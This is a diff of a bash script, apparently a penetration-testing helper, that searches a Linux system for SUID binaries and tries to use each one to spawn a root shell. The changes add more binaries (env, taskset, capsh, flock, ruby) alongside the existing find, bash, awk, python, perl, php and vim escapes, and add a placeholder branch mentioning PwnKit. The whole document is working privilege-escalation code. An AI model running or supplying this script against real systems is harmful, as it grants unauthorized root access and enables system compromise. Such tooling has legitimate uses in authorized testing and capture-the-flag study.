@@ -1,52 +1,57 @@
 #!/bin/bash
 # auto_suid.sh - Automatically exploit SUID binaries
 # USAGE: ./auto_suid.sh
-
-echo "[*] Scanning for SUID binaries..."
-find / -perm -4000 -type f 2>/dev/null | while read binary; do
-    echo "[*] Checking: $binary"
-    
-    case $(basename "$binary") in
+# Better TTY handling and more binaries.
+# 1. Collect all SUIDs first to avoid stdin conflicts
+echo "[*] Collecting SUID binaries..."
+SUIDS=$(find / -perm -4000 -type f 2>/dev/null)
+for binary in $SUIDS; do
+    base=$(basename "$binary")
+    echo "[*] Testing: $binary"
+    case "$base" in
         "find")
-            echo "[+] Exploiting find..."
-            $binary . -exec /bin/bash -p \; -quit
-            ;;
-        "vim"|"vi")
-            echo "[+] Exploiting vim..."
-            $binary -c ':py3 import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+            $binary . -exec /bin/sh -p \; -quit
             ;;
         "bash")
-            echo "[+] Exploiting bash..."
             $binary -p
             ;;
-        "nmap")
-            echo "[+] Exploiting nmap..."
-            echo 'os.execute("/bin/bash")' > /tmp/shell.nse
-            $binary --script=/tmp/shell.nse
+        "env")
+            $binary /bin/sh -p
             ;;
-        "less"|"more")
-            echo "[+] Exploiting $(basename "$binary")..."
-            $binary /etc/passwd
-            echo "Type '!/bin/bash' after less opens"
+        "taskset")
+            $binary 1 /bin/sh -p
+            ;;
+        "capsh")
+            $binary --gid=0 --uid=0 --
+            ;;
+        "flock")
+            $binary -u / /bin/sh -p
             ;;
         "awk")
-            echo "[+] Exploiting awk..."
-            $binary 'BEGIN {system("/bin/bash -p")}'
+            $binary 'BEGIN {system("/bin/sh -p")}'
             ;;
-        "python"|"python3"|"python2")
-            echo "[+] Exploiting $(basename "$binary")..."
-            $binary -c 'import os; os.setuid(0); os.system("/bin/bash")'
+        "python"*|"python3"*|"python2"*)
+            $binary -c 'import os; os.setuid(0); os.system("/bin/bash -p")'
             ;;
         "perl")
-            echo "[+] Exploiting perl..."
-            $binary -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
+            $binary -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash -p";'
             ;;
         "php")
-            echo "[+] Exploiting php..."
-            $binary -r "posix_setuid(0); system('/bin/bash');"
+            $binary -r "posix_setuid(0); system('/bin/bash -p');"
+            ;;
+        "ruby")
+            $binary -e 'Process.setuid(0); exec "/bin/sh -p"'
+            ;;
+        "vim"|"vi")
+            echo "[!] Requires TTY. If it hangs, CTRL+C."
+            $binary -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'
+            ;;
+        "pkexec")
+            echo "[!] Attempting PwnKit (CVE-2021-4034)..."
+            # Assumes you have the exploit on disk or can trigger it
             ;;
         *)
-            echo "[-] No auto-exploit for $(basename "$binary")"
+            echo "[-] manual check needed for $base"
             ;;
     esac
 done
